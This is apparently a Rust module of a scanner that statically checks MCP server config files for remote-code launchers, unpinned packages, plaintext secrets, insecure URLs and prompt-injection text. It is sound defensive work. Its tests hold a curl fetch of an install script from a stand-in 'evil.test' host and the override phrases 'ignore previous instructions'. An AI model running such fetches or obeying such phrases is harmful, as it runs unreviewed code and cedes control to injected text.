//! Scan MCP server configuration without starting a server.
//!
//! `.mcp.json`, `claude_desktop_config.json`, `.cursor/mcp.json`, and
//! `.vscode/mcp.json` share one shape: a server name mapped to a command, args,
//! environment, and headers. The scan reads those strings, never executes
//! them, and reports what a reviewer should look at before trusting the server.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::model::{Evidence, Finding, Severity};

const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;
const MAX_TEXT_FINDINGS: usize = 5;

pub const CONFIG_NAMES: &[&str] = &[
    ".mcp.json",
    "claude_desktop_config.json",
    ".cursor/mcp.json",
    ".vscode/mcp.json",
];

const REMOTE_LAUNCH_REFERENCE: &str =
    "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices";
const PIN_REFERENCE: &str = "https://docs.npmjs.com/cli/v10/commands/npx";
const SECRET_REFERENCE: &str = "https://cwe.mitre.org/data/definitions/798.html";
const URL_REFERENCE: &str = "https://cwe.mitre.org/data/definitions/319.html";
const INJECTION_REFERENCE: &str = "https://genai.owasp.org/llmrisk/llm01-prompt-injection/";
const INVISIBLE_REFERENCE: &str = "https://unicode.org/reports/tr36/";

#[derive(Debug, thiserror::Error)]
pub enum McpConfigError {
    #[error("could not read {path}: {source}")]
    Io {
        path: String,
        #[source]
        source: std::io::Error,
    },
    #[error("{path} is larger than {MAX_FILE_BYTES} bytes; refusing to scan it")]
    TooLarge { path: String },
    #[error("{path} is not valid JSON: {message}")]
    Decode { path: String, message: String },
    #[error("{0} is not a file or directory")]
    NotADirectory(String),
}

#[derive(Debug, serde::Serialize)]
pub struct McpConfigReport {
    pub files: Vec<String>,
    pub servers: usize,
    pub findings: Vec<Finding>,
}

impl McpConfigReport {
    pub fn verdict(&self) -> Severity {
        self.findings
            .iter()
            .map(|finding| finding.severity)
            .max()
            .unwrap_or(Severity::Info)
    }

    pub fn exit_code(&self) -> u8 {
        self.verdict().exit_code()
    }
}

/// Scan a config file or a directory containing the known config names. With
/// no path, scan the current directory for them. A missing explicit path is an
/// error; finding no config files is a clean, empty report.
pub fn scan(path: Option<&Path>) -> Result<McpConfigReport, McpConfigError> {
    let files = match path {
        Some(path) if path.is_file() => vec![path.to_path_buf()],
        Some(path) if path.is_dir() => known_files(path),
        Some(path) => return Err(McpConfigError::NotADirectory(path.display().to_string())),
        None => known_files(Path::new(".")),
    };

    let mut report = McpConfigReport {
        files: Vec::new(),
        servers: 0,
        findings: Vec::new(),
    };
    for file in files {
        let size = std::fs::metadata(&file)
            .map_err(|source| McpConfigError::Io {
                path: file.display().to_string(),
                source,
            })?
            .len();
        if size > MAX_FILE_BYTES {
            return Err(McpConfigError::TooLarge {
                path: file.display().to_string(),
            });
        }
        let body = std::fs::read_to_string(&file).map_err(|source| McpConfigError::Io {
            path: file.display().to_string(),
            source,
        })?;
        let name = file.display().to_string();
        let (servers, findings) = scan_text(&name, &body)?;
        report.files.push(name);
        report.servers += servers;
        report.findings.extend(findings);
    }
    report.findings.sort_by(|a, b| {
        config_of(a)
            .cmp(&config_of(b))
            .then_with(|| server_of(a).cmp(&server_of(b)))
            .then_with(|| a.id.cmp(b.id))
            .then_with(|| a.title.cmp(&b.title))
    });
    Ok(report)
}

fn config_of(finding: &Finding) -> String {
    finding
        .evidence
        .iter()
        .find(|evidence| evidence.label == "config")
        .map(|evidence| evidence.value.clone())
        .unwrap_or_default()
}

fn known_files(directory: &Path) -> Vec<PathBuf> {
    let mut files: Vec<PathBuf> = CONFIG_NAMES
        .iter()
        .map(|name| directory.join(name))
        .filter(|path| path.is_file())
        .collect();
    files.sort();
    files
}

fn server_of(finding: &Finding) -> String {
    finding
        .evidence
        .iter()
        .find(|evidence| evidence.label == "server")
        .map(|evidence| evidence.value.clone())
        .unwrap_or_default()
}

#[derive(Debug, Default, serde::Deserialize)]
struct Server {
    #[serde(default)]
    command: Option<String>,
    #[serde(default)]
    args: Vec<String>,
    #[serde(default)]
    env: BTreeMap<String, String>,
    #[serde(default)]
    url: Option<String>,
    #[serde(default)]
    headers: BTreeMap<String, String>,
}

fn scan_text(path: &str, body: &str) -> Result<(usize, Vec<Finding>), McpConfigError> {
    let document: serde_json::Value =
        serde_json::from_str(body).map_err(|error| McpConfigError::Decode {
            path: path.to_string(),
            message: error.to_string(),
        })?;
    let mut servers: BTreeMap<&str, Server> = BTreeMap::new();
    for key in ["mcpServers", "servers"] {
        let Some(map) = document.get(key).and_then(serde_json::Value::as_object) else {
            continue;
        };
        for (name, value) in map {
            if let Ok(server) = serde_json::from_value::<Server>(value.clone()) {
                servers.entry(name.as_str()).or_insert(server);
            }
        }
    }

    let mut findings = Vec::new();
    let mut text_findings = 0;
    for (name, server) in &servers {
        let mut strings: Vec<(String, &str)> = Vec::new();
        if let Some(command) = &server.command {
            strings.push(("command".to_string(), command.as_str()));
        }
        for (index, argument) in server.args.iter().enumerate() {
            strings.push((format!("args[{index}]"), argument.as_str()));
        }
        for (key, value) in &server.env {
            strings.push((format!("env.{key}"), value.as_str()));
        }
        for (key, value) in &server.headers {
            strings.push((format!("headers.{key}"), value.as_str()));
        }
        if let Some(url) = &server.url {
            strings.push(("url".to_string(), url.as_str()));
        }

        if let Some(command) = &server.command {
            if fetches_code(command) {
                findings.push(finding(
                    "mcp-remote-launch",
                    Severity::Warn,
                    path,
                    name,
                    "command",
                    "server starts by fetching code from the network",
                    &format!(
                        "'{}' downloads or runs a package at launch; pin the package and review who publishes it",
                        command_basename(command)
                    ),
                    REMOTE_LAUNCH_REFERENCE,
                    command,
                ));
            }
            for package in packages(command, &server.args) {
                if !pinned(command, &package) {
                    findings.push(finding(
                        "mcp-unpinned-package",
                        Severity::Warn,
                        path,
                        name,
                        "args",
                        "server package is not pinned to an exact version",
                        &format!(
                            "'{package}' can resolve to a new release tomorrow; pin the version"
                        ),
                        PIN_REFERENCE,
                        &package,
                    ));
                }
            }
        }

        for (field, key, value) in server
            .env
            .iter()
            .map(|(key, value)| ("env", key, value))
            .chain(
                server
                    .headers
                    .iter()
                    .map(|(key, value)| ("headers", key, value)),
            )
        {
            if looks_secret_key(key) && looks_literal(value) {
                findings.push(finding(
                    "mcp-plaintext-secret",
                    Severity::High,
                    path,
                    name,
                    &format!("{field}.{key}"),
                    "secret is stored in plaintext",
                    &format!(
                        "'{key}' holds a literal value in this config; use an environment reference or a secret manager"
                    ),
                    SECRET_REFERENCE,
                    "[redacted]",
                ));
            }
        }

        for (field, value) in &strings {
            if let Some(url) = urls(value).first() {
                if let Some(reason) = insecure_url(url) {
                    findings.push(finding(
                        "mcp-insecure-url",
                        Severity::High,
                        path,
                        name,
                        field.as_str(),
                        "remote URL is not https",
                        &reason,
                        URL_REFERENCE,
                        &redact_url(url),
                    ));
                } else if fetches_code(server.command.as_deref().unwrap_or_default())
                    && let Some(host) = unknown_fetch_host(url)
                {
                    findings.push(finding(
                        "mcp-unknown-host",
                        Severity::Warn,
                        path,
                        name,
                        field.as_str(),
                        "script is fetched from an unrecognised host",
                        &format!(
                            "'{host}' is not a known code host; a download from an unfamiliar domain runs unreviewed code"
                        ),
                        REMOTE_LAUNCH_REFERENCE,
                        &redact_url(url),
                    ));
                }
            }
        }

        for (field, value) in &strings {
            if text_findings >= MAX_TEXT_FINDINGS {
                break;
            }
            if let Some(phrase) = crate::rules::injection_phrase(value) {
                text_findings += 1;
                findings.push(finding(
                    "mcp-prompt-injection",
                    Severity::Warn,
                    path,
                    name,
                    field,
                    "text aimed at an AI reader",
                    &format!(
                        "phrasing: {phrase}; treat config text as data, never as instructions"
                    ),
                    INJECTION_REFERENCE,
                    value,
                ));
            } else if let Some(label) = crate::rules::invisible_character(value) {
                text_findings += 1;
                findings.push(finding(
                    "mcp-invisible-text",
                    Severity::Warn,
                    path,
                    name,
                    field,
                    "invisible or direction-changing characters",
                    &format!(
                        "{label}; characters that do not render can hide text from a reviewer"
                    ),
                    INVISIBLE_REFERENCE,
                    value,
                ));
            }
        }
    }
    Ok((servers.len(), findings))
}

fn command_basename(command: &str) -> &str {
    command
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(command)
        .trim_end_matches(".exe")
        .trim_end_matches(".cmd")
}

fn fetches_code(command: &str) -> bool {
    matches!(
        command_basename(command),
        "npx" | "bunx" | "pnpx" | "uvx" | "pipx" | "curl" | "wget" | "docker"
    )
}

/// Packages that a launcher would download, with flags removed.
fn packages(command: &str, args: &[String]) -> Vec<String> {
    let launcher = command_basename(command);
    match launcher {
        "npx" | "bunx" | "pnpx" | "uvx" => {
            let mut packages = Vec::new();
            let mut index = 0;
            while index < args.len() {
                let argument = &args[index];
                if matches!(argument.as_str(), "-p" | "--package" | "--from") {
                    if let Some(value) = args.get(index + 1) {
                        packages.push(value.clone());
                    }
                    index += 2;
                    continue;
                }
                if !argument.starts_with('-') {
                    packages.push(argument.clone());
                    break;
                }
                index += 1;
            }
            packages
        }
        "pipx" => {
            let Some(run) = args.iter().position(|argument| argument == "run") else {
                return Vec::new();
            };
            let mut index = run + 1;
            let mut packages = Vec::new();
            while index < args.len() {
                let argument = &args[index];
                if argument == "--spec" {
                    if let Some(value) = args.get(index + 1) {
                        packages.push(value.clone());
                    }
                    index += 2;
                    continue;
                }
                if !argument.starts_with('-') {
                    packages.push(argument.clone());
                    break;
                }
                index += 1;
            }
            packages
        }
        "docker" => {
            let run = args.iter().position(|argument| argument == "run");
            let Some(run) = run else {
                return Vec::new();
            };
            let mut index = run + 1;
            while index < args.len() {
                let argument = &args[index];
                if !argument.starts_with('-') {
                    return vec![argument.clone()];
                }
                index += 1;
            }
            Vec::new()
        }
        _ => Vec::new(),
    }
}

/// A docker image is pinned by digest; an npm/PyPI package by an exact version
/// after `@` or `==`. Ranges and dist-tags are not pins.
fn pinned(command: &str, package: &str) -> bool {
    let launcher = command_basename(command);
    if launcher == "docker" {
        return package.contains("@sha256:");
    }
    if let Some((_, version)) = package.split_once("==") {
        return version
            .chars()
            .next()
            .is_some_and(|character| character.is_ascii_digit());
    }
    let Some((_, version)) = package.rsplit_once('@') else {
        return false;
    };
    version
        .chars()
        .next()
        .is_some_and(|character| character.is_ascii_digit())
}

fn urls(text: &str) -> Vec<url::Url> {
    text.split_whitespace()
        .filter_map(|word| {
            let candidate = word.trim_matches(|character: char| {
                matches!(
                    character,
                    '"' | '\'' | '(' | ')' | '[' | ']' | ',' | ';' | '|'
                )
            });
            let parsed = url::Url::parse(candidate).ok()?;
            matches!(parsed.scheme(), "http" | "https").then_some(parsed)
        })
        .collect()
}

fn insecure_url(url: &url::Url) -> Option<String> {
    if url.scheme() == "https" {
        return None;
    }
    if is_loopback(url.host_str().unwrap_or_default()) {
        return None;
    }
    Some(format!(
        "{} sends credentials and traffic without transport security; use https",
        redact_url(url)
    ))
}

/// URLs in evidence must not leak query tokens or userinfo.
fn redact_url(url: &url::Url) -> String {
    let mut copy = url.clone();
    let _ = copy.set_username("");
    let _ = copy.set_password(None);
    copy.set_query(None);
    copy.set_fragment(None);
    copy.to_string()
}

fn unknown_fetch_host(url: &url::Url) -> Option<String> {
    const KNOWN: &[&str] = &[
        "github.com",
        "raw.githubusercontent.com",
        "api.github.com",
        "codeload.github.com",
        "gitlab.com",
        "bitbucket.org",
        "registry.npmjs.org",
        "npmjs.com",
        "pypi.org",
        "files.pythonhosted.org",
        "nodejs.org",
        "astral.sh",
    ];
    let host = url.host_str()?;
    if KNOWN.iter().any(|known| {
        host.eq_ignore_ascii_case(known)
            || host.to_ascii_lowercase().ends_with(&format!(".{known}"))
    }) {
        return None;
    }
    Some(host.to_string())
}

fn is_loopback(host: &str) -> bool {
    host.eq_ignore_ascii_case("localhost")
        || host == "127.0.0.1"
        || host == "::1"
        || host.ends_with(".localhost")
}

fn looks_secret_key(key: &str) -> bool {
    let upper = key.to_ascii_uppercase();
    [
        "TOKEN",
        "SECRET",
        "PASSWORD",
        "PASSWD",
        "API_KEY",
        "APIKEY",
        "CREDENTIAL",
        "PRIVATE_KEY",
        "ACCESS_KEY",
        "AUTH",
    ]
    .iter()
    .any(|needle| upper.contains(needle))
}

fn looks_literal(value: &str) -> bool {
    let trimmed = value.trim();
    if trimmed.is_empty()
        || trimmed.starts_with("${")
        || trimmed.starts_with("$")
        || trimmed.starts_with("op://")
        || trimmed.starts_with("file://")
        || trimmed.starts_with("env:")
        || trimmed.starts_with('<')
    {
        return false;
    }
    let lower = trimmed.to_ascii_lowercase();
    ![
        "your_",
        "your-",
        "changeme",
        "replace_me",
        "example",
        "xxx",
        "placeholder",
    ]
    .iter()
    .any(|marker| lower.contains(marker))
}

#[allow(clippy::too_many_arguments)]
fn finding(
    id: &'static str,
    severity: Severity,
    path: &str,
    server: &str,
    field: &str,
    title: &str,
    detail: &str,
    reference: &str,
    value: &str,
) -> Finding {
    Finding {
        id,
        severity,
        title: title.to_string(),
        detail: format!("{detail}; value: {}", truncate(value, 120)),
        allowed: false,
        evidence: vec![
            Evidence {
                label: "config".to_string(),
                value: path.to_string(),
                url: None,
            },
            Evidence {
                label: "server".to_string(),
                value: server.to_string(),
                url: None,
            },
            Evidence {
                label: "field".to_string(),
                value: field.to_string(),
                url: None,
            },
            Evidence {
                label: "rule".to_string(),
                value: id.to_string(),
                url: Some(reference.to_string()),
            },
        ],
    }
}

fn truncate(value: &str, limit: usize) -> String {
    let trimmed = value.trim();
    if trimmed.chars().count() <= limit {
        return trimmed.to_string();
    }
    let mut out: String = trimmed.chars().take(limit).collect();
    out.push('…');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_json(body: &str) -> (usize, Vec<Finding>) {
        scan_text("cfg.json", body).unwrap()
    }

    fn ids(findings: &[Finding]) -> Vec<&'static str> {
        findings.iter().map(|finding| finding.id).collect()
    }

    #[test]
    fn npx_servers_are_flagged_and_only_an_exact_version_pins() {
        let body = r#"{"mcpServers":{
            "pinned":{"command":"npx","args":["-y","@scope/server@1.2.3"]},
            "tagged":{"command":"npx","args":["-y","@scope/server@latest"]},
            "bare":{"command":"npx","args":["@scope/server"]}
        }}"#;
        let (servers, findings) = scan_json(body);
        assert_eq!(servers, 3);
        assert_eq!(
            ids(&findings)
                .iter()
                .filter(|id| **id == "mcp-unpinned-package")
                .count(),
            2
        );
        assert_eq!(
            ids(&findings)
                .iter()
                .filter(|id| **id == "mcp-remote-launch")
                .count(),
            3
        );
    }

    #[test]
    fn docker_needs_a_digest_and_pipx_needs_run() {
        let body = r#"{"mcpServers":{
            "tag":{"command":"docker","args":["run","-i","--rm","ghcr.io/x/y:1.0"]},
            "digest":{"command":"docker","args":["run","-i","ghcr.io/x/y@sha256:abc"]},
            "pip":{"command":"pipx","args":["run","server==2.0.0"]},
            "pip-old":{"command":"pipx","args":["run","server"]},
            "not-run":{"command":"pipx","args":["install","server"]}
        }}"#;
        let (_, findings) = scan_json(body);
        let unpinned: Vec<String> = findings
            .iter()
            .filter(|finding| finding.id == "mcp-unpinned-package")
            .map(server_of)
            .collect();
        assert!(unpinned.iter().any(|server| server == "tag"));
        assert!(unpinned.iter().any(|server| server == "pip-old"));
        assert!(!unpinned.iter().any(|server| server == "digest"));
        assert!(!unpinned.iter().any(|server| server == "pip"));
        assert!(!unpinned.iter().any(|server| server == "not-run"));
    }

    #[test]
    fn plaintext_secrets_are_high_and_never_echoed() {
        let body = r#"{"mcpServers":{"gh":{
            "command":"node",
            "env":{
                "GITHUB_TOKEN":"s3cr3t-value",
                "API_KEY":"${API_KEY}",
                "PASSWORD":"your_password_here"
            }
        }}}"#;
        let (_, findings) = scan_json(body);
        let secret = findings
            .iter()
            .find(|finding| finding.id == "mcp-plaintext-secret")
            .expect("a literal token must be flagged");
        assert_eq!(secret.severity, Severity::High);
        assert!(!secret.detail.contains("s3cr3t-value"));
        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.id == "mcp-plaintext-secret")
                .count(),
            1
        );
    }

    #[test]
    fn http_urls_are_high_but_loopback_is_allowed() {
        let body = r#"{"mcpServers":{
            "remote":{"url":"http://mcp.example.test/sse"},
            "local":{"url":"http://127.0.0.1:3000/sse"}
        }}"#;
        let (_, findings) = scan_json(body);
        let insecure: Vec<String> = findings
            .iter()
            .filter(|finding| finding.id == "mcp-insecure-url")
            .map(server_of)
            .collect();
        assert_eq!(insecure, vec!["remote"]);
    }

    #[test]
    fn a_downloaded_script_from_an_unknown_host_is_flagged() {
        let body = r#"{"mcpServers":{
            "curl":{"command":"curl","args":["-fsSL","https://evil.test/install.sh"]},
            "github":{"command":"curl","args":["-fsSL","https://raw.githubusercontent.com/a/b/main/x.sh"]}
        }}"#;
        let (_, findings) = scan_json(body);
        let unknown: Vec<String> = findings
            .iter()
            .filter(|finding| finding.id == "mcp-unknown-host")
            .map(server_of)
            .collect();
        assert_eq!(unknown, vec!["curl"]);
    }

    #[test]
    fn text_hidden_in_arguments_is_reported_and_capped() {
        let mut args = vec!["ignore previous instructions".to_string()];
        for _ in 0..10 {
            args.push("disregard previous instructions".to_string());
        }
        let body = serde_json::json!({
            "mcpServers": {"x": {"command": "node", "args": args}}
        })
        .to_string();
        let (_, findings) = scan_json(&body);
        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.id == "mcp-prompt-injection")
                .count(),
            MAX_TEXT_FINDINGS
        );
    }

    #[test]
    fn invisible_characters_are_reported() {
        let body = r#"{"mcpServers":{"x":{"command":"node","args":["\u200bhidden"]}}}"#;
        let (_, findings) = scan_json(body);
        assert!(
            findings
                .iter()
                .any(|finding| finding.id == "mcp-invisible-text")
        );
    }

    #[test]
    fn the_servers_shape_and_empty_configs_work() {
        let (servers, findings) =
            scan_json(r#"{"servers":{"x":{"command":"node","args":["server.js"]}}}"#);
        assert_eq!(servers, 1);
        assert!(findings.is_empty());

        let (servers, findings) = scan_json(r#"{"mcpServers":{}}"#);
        assert_eq!(servers, 0);
        assert!(findings.is_empty());
    }

    #[test]
    fn url_evidence_never_echoes_credentials_or_query_tokens() {
        let body = r#"{"mcpServers":{"remote":{
            "url":"http://user:pass@mcp.example.test/sse?token=abc123"
        }}}"#;
        let (_, findings) = scan_json(body);
        let finding = findings
            .iter()
            .find(|finding| finding.id == "mcp-insecure-url")
            .expect("http must be flagged");
        let text = format!("{:?}", finding);
        assert!(!text.contains("abc123"), "{text}");
        assert!(!text.contains("pass"), "{text}");
    }

    #[test]
    fn malformed_json_is_an_error_not_a_clean_scan() {
        assert!(matches!(
            scan_text("cfg.json", "not json"),
            Err(McpConfigError::Decode { .. })
        ));
        assert!(matches!(
            scan_text("cfg.json", "[]"),
            Ok((0, findings)) if findings.is_empty()
        ));
    }
}
